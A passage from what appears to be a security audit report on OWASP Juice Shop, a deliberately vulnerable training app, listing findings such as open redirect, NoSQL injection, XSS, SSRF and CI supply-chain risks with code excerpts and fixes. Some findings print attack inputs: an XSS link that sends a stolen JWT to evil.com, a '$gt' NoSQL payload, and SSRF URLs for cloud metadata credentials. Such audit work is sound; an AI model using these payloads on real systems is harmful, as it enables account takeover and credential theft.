The victim is taken to `evil.example.com` while believing they followed a legitimate Juice Shop link. Any unauthenticated attacker can redirect authenticated users from a trusted Juice Shop link to an arbitrary attacker-controlled domain, enabling credential phishing or malware delivery.

**Evidence:** `performRedirect` at `routes/redirect.ts:17` delegates to `security.isRedirectAllowed(toUrl)`, whose substring `includes()` match passes when an allowlisted URL appears anywhere in the attacker-supplied `to` value.

```typescript
// routes/redirect.ts:17
    const toUrl: string = query.to as string
    if (security.isRedirectAllowed(toUrl)) {
      challengeUtils.solveIf(challenges.redirectCryptoCurrencyChallenge, () => { return toUrl === 'https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW' || toUrl === 'https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm' || toUrl === 'https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6' })
      challengeUtils.solveIf(challenges.redirectChallenge, () => { return isUnintendedRedirect(toUrl) })
      res.redirect(toUrl)
```

**Fix:** ◕ [M-021](#m-021) — Replace substring allowlist match with exact URL equality check in isRedirectAllowed (`redirect.ts:17`)

**Classification:** Open Redirect · [CWE-601](https://cwe.mitre.org/data/definitions/601.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

<a id="t-022"></a><a id="f-022"></a>

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/dataErasure.ts:104`

**Weakness:** [W-005](#w-005) - Input handling lacks enforced boundary validation

**Issue:** A request-controlled path with `../` can read arbitrary files (`/etc/passwd`, source, secrets) or write outside the intended root.

```typescript
// routes/dataErasure.ts:104

      if (req.body.layout) {
        const filePath: string = path.resolve(req.body.layout).toLowerCase()
        const isForbiddenFile: boolean = (filePath.includes('ftp') || filePath.includes('ctf.key') || filePath.includes('encryptionkeys'))
        if (!isForbiddenFile) {
```

**Fix:** Resolve and normalise every constructed path and reject anything that escapes the intended base directory → ◕ [M-022](#m-022) — Resolve the path, assert it stays within an allowed base directory (`path.resolve` + startsWith), and use `path.basename` on user input. (`dataErasure.ts:104`)

**Classification:** Insecure File Handling · [CWE-22](https://cwe.mitre.org/data/definitions/22.html) · [OWASP A06:2025](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)

<a id="t-023"></a><a id="f-023"></a>
#### F-023 · Non-cryptographic RNG for a secret/token lib/insecurity.ts:53

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `lib/insecurity.ts:53`

**Weakness:** [W-007](#w-007) - Security-sensitive data uses weak cryptographic primitives

**Issue:** A predictable token/secret lets an attacker guess or brute-force session identifiers, reset links, or OTPs.

```typescript
// lib/insecurity.ts:53

export const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)
export const denyAll = () => expressJwt({ secret: '' + Math.random() } as any)
export const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })
export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false
```

**Fix:** Switch to a cryptographically secure RNG (`crypto.randomBytes` / OS `/dev/urandom`) → ◕ [M-023](#m-023) — Use `crypto.randomBytes` / `crypto.randomUUID` / webcrypto getRandomValues for any security value. (`insecurity.ts:53`)

**Classification:** Cryptographic Failures · [CWE-330](https://cwe.mitre.org/data/definitions/330.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-024"></a><a id="f-024"></a>
#### F-024 · NoSQL injection allows mass review update via unconstrained _id filter

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/updateProductReviews.ts:18`

**Issue:** The review update handler passes `req.body.id` directly as the MongoDB `_id` filter with `{ multi: true }`: `db.reviewsCollection.update({ _id: req.body.id }, { $set: { message } }, { multi: true })`. An authenticated attacker sends `{ "id": { "$gt": "" }, "message": "hacked" }` - the `$gt: ""` operator matches every document.

Combined with `multi: true`, this overwrites every review in the collection in a single request. Any authenticated user can overwrite all product reviews simultaneously, defacing the application and destroying review integrity.

**Evidence:** `routes/updateProductReviews.ts:18`: `db.reviewsCollection.update({ _id: req.body.id }, ... { multi: true })` - `req.body.id` used directly as MongoDB filter without type validation.

```typescript
// routes/updateProductReviews.ts:18
    const user = security.authenticatedUsers.from(req) // vuln-code-snippet vuln-line forgedReviewChallenge
    db.reviewsCollection.update( // vuln-code-snippet neutral-line forgedReviewChallenge
      { _id: req.body.id }, // vuln-code-snippet vuln-line noSqlReviewsChallenge forgedReviewChallenge
      { $set: { message: req.body.message } },
      { multi: true } // vuln-code-snippet vuln-line noSqlReviewsChallenge
```

**Fix:** Replace string concatenation in query operators with parameter binding → ◕ [M-024](#m-024) — Validate and cast review _id to ObjectID before use in MongoDB query (`updateProductReviews.ts:18`)

**Classification:** Injection · [CWE-943](https://cwe.mitre.org/data/definitions/943.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/)

<a id="t-025"></a><a id="f-025"></a>
#### F-025 · Floating Tag Third-Party CI Action

**Severity:** 🟠 High  ·  **Component:** [C-06](#c-06) - CI/CD Pipeline  ·  **Location:** Multiple locations (2)

**Weakness:** [W-006](#w-006) - Build pipeline trusts mutable third-party references

**Instances (2):** 🟠 `.github/workflows/image_actions.yml:33`, 🟡 `.github/workflows/codeql-analysis.yml:24`

**Issue:** An attacker who compromises the `calibreapp/image-actions` GitHub repository (or a maintainer of that repo acting maliciously) pushes a new commit to its `main` branch. Because `image_actions.yml:33` references `calibreapp/image-actions@main`, the next workflow run that triggers on an image-path push or merge to `master`/`develop` automatically executes the attacker's code inside the juice-shop CI runner.

The step runs with `GITHUB_TOKEN` (which has `contents: write` and `pull-requests: write` permissions from the workflow-level defaults) and can create pull requests, modify repository files, or exfiltrate any secret available to the job - including `GITHUB_TOKEN`. Supply-chain compromise of `calibreapp/image-actions` yields arbitrary code execution in the CI runner with repository-write access, enabling tampering with source, pushing malicious commits, or exfiltrating workflow secrets.

**Evidence:** `image_actions.yml:33` specifies `uses: calibreapp/image-actions@main` - a floating branch reference that resolves to the current HEAD of the upstream repo's `main` branch at every workflow execution, with no content hash verification.

```yaml
// .github/workflows/image_actions.yml:33
      - name: Compress Images
        id: calibre
        uses: calibreapp/image-actions@main
        with:
          githubToken: ${{ secrets.GITHUB_TOKEN }}
```

**Fix:** ◕ [M-025](#m-025) — Pin calibreapp/image-actions to a full commit SHA in (`image_actions.yml:33`)

**Classification:** Supply-Chain Integrity · [CWE-829](https://cwe.mitre.org/data/definitions/829.html) · [OWASP A03:2025](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)

<a id="t-026"></a><a id="f-026"></a>
#### F-026 · Postinstall Hook Executes Frontend Build on npm install (package\.json:56)

**Severity:** 🟠 High  ·  **Component:** [C-06](#c-06) - CI/CD Pipeline  ·  **Location:** `package.json:56`

**Weakness:** [W-006](#w-006) - Build pipeline trusts mutable third-party references

**Issue:** The `package.json` `postinstall` hook (`cd frontend && npm install && npm run build:frontend`) executes automatically whenever any CI job runs `npm install` without `--ignore-scripts`. In `ci.yml`, the `coding-challenge-rsn`, `api-test`, `server-test`, `custom-config-test`, `e2e-test`, and `smoke-test` jobs all run bare `npm install` (lines 51, 110, 147, 202, 238, etc.).

If a transitive dependency is compromised at any depth in the dependency graph - for example, a popular utility package whose maintainer account is hijacked and a new malicious version published - the `postinstall` hook sequence causes `npm install --ignore-scripts` protections to be bypassed in the frontend install, and the malicious package's own `postinstall` hook executes inside the CI runner with full filesystem access. A compromised transitive frontend dependency executes arbitrary code in the CI runner at install time, with access to environment variables (workflow secrets) and the full repository checkout.

**Evidence:** `package.json:56` defines `postinstall: "cd frontend && npm install && ..."`, causing a nested `npm install` (without `--ignore-scripts`) to execute inside any CI job that runs bare `npm install`, propagating hook execution to all frontend transitive dependencies.

```json
// package.json:56
    "cypress:open": "cypress open",
    "cypress:run": "cypress run",
    "postinstall": "cd frontend && npm install && cd .. && npm run build:frontend && (npm run --silent build:server || cd .)",
    "lint": "eslint *.ts data lib models routes test/**/*.ts views && npm run lint:config && cd frontend && npm run lint && npm run lint:scss && cd ..",
    "lint:config": "tsx lib/scripts/lintConfig.ts",
```

**Fix:** ◕ [M-026](#m-026) — Replace postinstall with an explicit CI build step and add --ignore-scripts to the nested frontend install (`package.json:56`)

**Classification:** Supply-Chain Integrity · [CWE-829](https://cwe.mitre.org/data/definitions/829.html) · [OWASP A03:2025](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)

<a id="t-027"></a><a id="f-027"></a>
#### F-027 · Conditional Input Sanitization Bypass in User Model (models/user.ts:48)

**Severity:** 🟠 High  ·  **Component:** [C-05](#c-05) - Data Persistence Layer  ·  **Location:** `models/user.ts:48`

**Issue:** The User model's `username` setter (`models/user.ts:47-54`) selects between two sanitization paths based on whether a challenge flag is active: when `persistedXssUserChallenge` is enabled, it calls `security.sanitizeLegacy(username)`, which is deliberately less strict; otherwise it calls `security.sanitizeSecure(username)`. In a running Juice Shop instance with challenges enabled (the default), any registration or profile update can supply XSS payloads that survive `sanitizeLegacy`.

The same conditional pattern appears for the `email` setter (lines 60-70): when the challenge is enabled, no sanitization is applied at all and the raw email value - including `<iframe src="javascript:alert(`xss`)">` - is persisted. XSS payloads stored in the `username` and `email` fields are rendered to admin users or other visitors who view the affected profile or feedback page, enabling session hijacking.

**Evidence:** The `username` setter at `models/user.ts:48` applies `sanitizeLegacy` instead of `sanitizeSecure` when `persistedXssUserChallenge` is active; the `email` setter at line 60 skips sanitization entirely in the same condition.

```typescript
// models/user.ts:48
        defaultValue: '',
        set (username: string) {
          if (utils.isChallengeEnabled(challenges.persistedXssUserChallenge)) {
            username = security.sanitizeLegacy(username)
          } else {
```

**Fix:** ◕ [M-027](#m-027) — Apply strict output encoding at render time regardless of challenge state; decouple XSS challenge from model sanitization logic (`user.ts:48`)

**Classification:** Injection · [CWE-20](https://cwe.mitre.org/data/definitions/20.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/)

<a id="t-028"></a><a id="f-028"></a>
#### F-028 · File Upload Storage Without Content Validation (ftp/)

**Severity:** 🟠 High  ·  **Component:** [C-05](#c-05) - Data Persistence Layer  ·  **Location:** `ftp/`

**Issue:** The application stores user-uploaded files in the `ftp/` directory (confirmed present with files such as `coupons_2013.md.bak`, `eastere.gg`, `encrypt.pyc`). The file upload handler accepts files without server-side MIME type validation, magic-byte inspection, or anti-malware scanning before writing to disk.

An attacker can upload a PHP webshell disguised as a JPEG, a polyglot file (JPEG+ZIP containing exploit), or a script that executes when the `ftp/` directory is served. Arbitrary file placement in the served ftp/ directory enables malware hosting, webshell execution (if directory is executable), and exfiltration of backup files that may contain secrets.

**Evidence:** The `ftp/` directory contains files with mixed types (`.pyc`, `.bak`, `.md`, `.gg`) indicating no enforced content policy at upload time.

**Fix:** Validate uploaded file type, size, and storage path; never execute uploaded content → ◕ [M-028](#m-028) — Validate file type via magic-byte inspection and content-length limit before writing to the ftp/ directory

**Classification:** Insecure File Handling · [CWE-434](https://cwe.mitre.org/data/definitions/434.html) · [OWASP A06:2025](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)

<a id="t-029"></a><a id="f-029"></a>
#### F-029 · Cross-Site Scripting (XSS)

**Severity:** 🟠 High  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** Multiple locations (3)

**Instances (3):** `frontend/src/app/search-result/search-result.component.ts:143`, `frontend/src/app/search-result/search-result.component.ts:110`, `frontend/src/app/about/about.component.ts:119`

**Issue:** In `search-result.component.ts:143`, the URL query parameter `q` is read directly via `this.route.snapshot.queryParams.q`, passed through `this.sanitizer.bypassSecurityTrustHtml(queryParam)`, and assigned to `this.searchValue` which is rendered in the template as trusted HTML. Because Angular's `DomSanitizer.bypassSecurityTrustHtml()` explicitly disables all HTML sanitization, any attacker who crafts a link such as `/#/search?q=<img src=x onerror=fetch('https://evil.com?t='+localStorage.getItem('token'))>` achieves immediate code execution in the victim's browser context.

No Content Security Policy is in place to block the injected script or exfiltration request. Full DOM-based XSS allowing arbitrary JavaScript execution in the victim's browser, immediate theft of the JWT from localStorage, and account takeover.

**Evidence:** At `search-result.component.ts:143`, the raw `queryParams.q` value is passed directly to `this.sanitizer.bypassSecurityTrustHtml()`, which marks the attacker-supplied string as safe for DOM insertion, bypassing all Angular output encoding.

```typescript
// frontend/src/app/search-result/search-result.component.ts:143
      }) // vuln-code-snippet hide-end
      this.dataSource.filter = queryParam.toLowerCase()
      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam) // vuln-code-snippet vuln-line localXssChallenge xssBonusChallenge
      if (this.gridDataSourceSubscription) {
        this.gridDataSourceSubscription.unsubscribe()
```

**Fix:** Output-encode untrusted strings at every sink and remove all `bypassSecurityTrustHtml` calls → ◕ [M-029](#m-029) — Remove bypassSecurityTrustHtml from URL query parameter handling in search-result component (`search-result.component.ts:143`)

**Classification:** Cross-Site Scripting (XSS) · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/)

<a id="t-031"></a><a id="f-031"></a>
#### F-031 · Missing Security Event Logging

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** Multiple locations (5)

**Instances (5):** 🟠 `server.ts:338`, 🟠 `models/index.ts:43`, 🟡 `routes/chat.ts:227`, 🟡 `lib/startup/registerWebsocketEvents.ts:40`, 🟡 `routes/checkKeys.ts:6`

**Issue:** The application uses Morgan HTTP access logging (`server.ts:338`) but has no structured security audit log. Successful and failed login attempts, password changes, password resets, account registrations, and admin-role grants are not written to an append-only security log with actor, action, resource, and outcome fields.

An attacker who exploits the SQL injection to authenticate as admin leaves no forensic record distinguishable from legitimate access, and a compromised admin account's actions cannot be attributed. Post-incident forensics cannot reconstruct the attack timeline; regulatory audit requirements (ISO 27001, SOC 2 CC7) cannot be met; attacker actions are indistinguishable from legitimate user activity.

**Evidence:** `server.ts:338` configures `morgan('combined')` for HTTP access logging; no security event logger (login, password-change, role-grant) is wired into any of the authentication routes examined.

```typescript
// server.ts:338
    max_logs: '2d'
  })
  app.use(morgan('combined', { stream: accessLogStream }))

  // vuln-code-snippet start resetPasswordMortyChallenge
```

**Fix:** ◕ [M-031](#m-031) — Emit structured security audit events for all authentication and privileged-action outcomes (`server.ts:338`)

**Classification:** Missing Audit Logging & Accountability · [CWE-778](https://cwe.mitre.org/data/definitions/778.html) · [OWASP A09:2025](https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/)

<a id="t-032"></a><a id="f-032"></a>
#### F-032 · User-Controlled X-User-Email Header Enables Audit Log Falsification

**Severity:** 🟠 High  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/Services/request.interceptor.ts:22`

**Issue:** The HTTP interceptor at `request.interceptor.ts:20-26` injects an `X-User-Email` header on every request using the value of `localStorage.getItem('email')`. The `email` entry in localStorage is set by the login component when the 'Remember Me' checkbox is selected (`login.component.ts:135`), but it is a plain string with no integrity binding to the authenticated JWT.

Any user - or an XSS payload - can execute `localStorage.setItem('email', 'admin@juice-sh.op')` in the browser console and subsequently perform any API action. An authenticated user can falsify their email identity in server audit logs, enabling repudiation of malicious actions and false attribution to other users including administrators.

**Evidence:** `request.interceptor.ts:22` sets `'X-User-Email': String(localStorage.getItem('email'))` on every outbound request; the localStorage `email` key is user-settable without any signature or integrity check.

```typescript
// frontend/src/app/Services/request.interceptor.ts:22
    if (localStorage.getItem('email')) {
      req = req.clone({
        setHeaders: {
          'X-User-Email': String(localStorage.getItem('email'))
        }
```

**Fix:** ◕ [M-032](#m-032) — Derive user identity exclusively from the verified JWT subject claim on the server side (`request.interceptor.ts:22`)

**Classification:** Supply-Chain Integrity · [CWE-345](https://cwe.mitre.org/data/definitions/345.html) · [OWASP A03:2025](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)

<a id="t-033"></a><a id="f-033"></a>
#### F-033 · TOTP Intermediate Token Stored in localStorage (login.component.ts:120)

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - Authentication and Authorization Service  ·  **Location:** `frontend/src/app/login/login.component.ts:120`

**Issue:** When a user with 2FA enabled completes the first factor (password), the server returns a short-lived JWT (`tmpToken`) indicating `type: 'password_valid_needs_second_factor_token'`. The login component writes this token to `localStorage.setItem('totp_tmp_token', error.data.tmpToken)`.

The two-factor-auth-service reads it back at `two-factor-auth-service.ts:38`: `tmpToken: localStorage.getItem('totp_tmp_token')`. XSS during the 2FA flow allows theft of the intermediate token, potentially enabling an attacker to complete authentication as the victim and fully bypass 2FA.

**Evidence:** `login.component.ts:120` writes `localStorage.setItem('totp_tmp_token', error.data.tmpToken)` - the intermediate 2FA credential is stored in XSS-readable browser storage.

```typescript
// frontend/src/app/login/login.component.ts:120
      error: ({ error }) => {
        if (error.status && error.data && error.status === 'totp_token_required') {
          localStorage.setItem('totp_tmp_token', error.data.tmpToken)
          this.ngZone.run(async () => await this.router.navigate(['/2fa/enter']))
          return
```

**Fix:** ◕ [M-033](#m-033) — Store the TOTP intermediate token in sessionStorage with a short TTL and clear it after verification (`login.component.ts:120`)

**Classification:** Insecure Client-Side Storage · [CWE-312](https://cwe.mitre.org/data/definitions/312.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-034"></a><a id="f-034"></a>
#### F-034 · Unauthenticated Prometheus metrics endpoint exposes internal application teleme…

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `server.ts:729`

**Issue:** The `/metrics` route is registered twice - once inside `configureApp` at line 676 and again at the module level at line 729 - both without any authentication middleware. Prometheus metrics expose endpoint request counts, latencies, queue depths, custom business counters (file upload sizes, active challenges, etc.), and Express/Node version information via the `errorhandler.title` at line 730.

An external attacker can use this to enumerate active endpoints, detect low-traffic periods for coordinated attacks, and fingerprint the exact Express version to target known CVEs. Application topology disclosure, endpoint enumeration, framework version fingerprinting; all accessible without credentials from the public internet.

**Evidence:** `server.ts:676`: `app.get('/metrics', utils.asyncHandler(metrics.serveMetrics()))` inside `configureApp`; `server.ts:729`: same route registered again at module level - both without preceding auth middleware.

**Fix:** Restrict the response to the minimum fields needed and never echo secrets → ◕ [M-034](#m-034) — Restrict `/metrics` to internal network or add bearer-token authentication (`server.ts:729`)

**Classification:** Error Information Disclosure · [CWE-200](https://cwe.mitre.org/data/definitions/200.html) · [OWASP A02:2025](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/)

<a id="t-035"></a><a id="f-035"></a>
#### F-035 · Hardcoded HMAC secret exposes security-answer hashes (lib/insecurity.ts:42)

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `lib/insecurity.ts:42`

**Weakness:** [W-003](#w-003) - Secrets are committed to source instead of a managed store

**Issue:** The `hmac()` function at `lib/insecurity.ts:42` uses a hardcoded secret `'pa4qacea4VK9t9nGv7yZtwmj'` for HMAC-SHA256 of security answers. The `resetPassword.ts:41` verification compares `security.hmac(answer) === data.answer`.

An attacker who obtains a dump of the SecurityAnswers table (via the SQL injection at `routes/search.ts:23`) can precompute HMAC values for common security answers offline using the known key, enabling targeted account takeover via the password reset flow without any server interaction. Offline cracking of security answers enables account takeover for any user whose SecurityAnswer hash is exposed via SQL injection, without triggering any rate limits.

**Evidence:** `lib/insecurity.ts:42`: `crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj')` - static string used as HMAC key for all security-answer storage.

**Fix:** Move the cryptographic key out of source control into a managed secret store and rotate it → ◕ [M-035](#m-035) — Replace hardcoded HMAC secret with environment-variable key and add per-answer salt (`insecurity.ts:42`)

**Classification:** Cryptographic Failures · [CWE-321](https://cwe.mitre.org/data/definitions/321.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-036"></a><a id="f-036"></a>
#### F-036 · SSRF via unconstrained profile image URL fetch (profileImageUrlUpload.ts:24)

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - Express REST API Backend  ·  **Location:** `routes/profileImageUrlUpload.ts:24`

**Issue:** The profile image URL handler calls `fetch(url)` where `url = req.body.imageUrl` with no scheme or host validation beyond a loose `includes('/solve/challenges/server-side')` check. An authenticated attacker sets `imageUrl` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS EC2 metadata) or `http://localhost:3000/rest/admin/application-configuration` (internal REST endpoint).

The server makes the request and - when `response.ok` is true - writes the response body to a file in `uploads/`. Internal service probe and data exfiltration: cloud metadata credentials (AWS IAM role credentials), internal API responses, and private network host enumeration - all accessible to any authenticated user.

**Evidence:** `routes/profileImageUrlUpload.ts:24`: `const response = await fetch(url)` where `url` is directly from `req.body.imageUrl`; the only guard is a regex check for a challenge-solver path, not a host allowlist.

```typescript
// routes/profileImageUrlUpload.ts:24
      if (loggedInUser) {
        try {
          const response = await fetch(url)
          if (!response.ok || !response.body) {
            throw new Error('url returned a non-OK status code or an empty body')
```

**Fix:** Validate the URL scheme + host against an explicit allow-list before issuing outbound requests → ◕ [M-036](#m-036) — Validate imageUrl against an allowed scheme and host allowlist before fetching (`profileImageUrlUpload.ts:24`)

**Classification:** Server-Side Request Forgery · [CWE-918](https://cwe.mitre.org/data/definitions/918.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

```yaml
// .github/workflows/ci.yml:1
name: "CI/CD Pipeline"
on:
  push:
```

**Fix:** ◕ [M-037](#m-037) — Add `permissions: { contents: read }` at workflow root; elevate per-job only where needed (`ci.yml:1`)

#### F-038 · Third-party GitHub Actions pinned to commit SHA

**Severity:** 🟠 High  ·  **Component:** [C-06](#c-06) - CI/CD Pipeline  ·  **Location:** Multiple locations (2)

```yaml
// .github/workflows/ci.yml:188
          name: api-test-lcov
      - name: "Publish coverage to Coveralls"
        uses: coverallsapp/github-action@v2
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
```
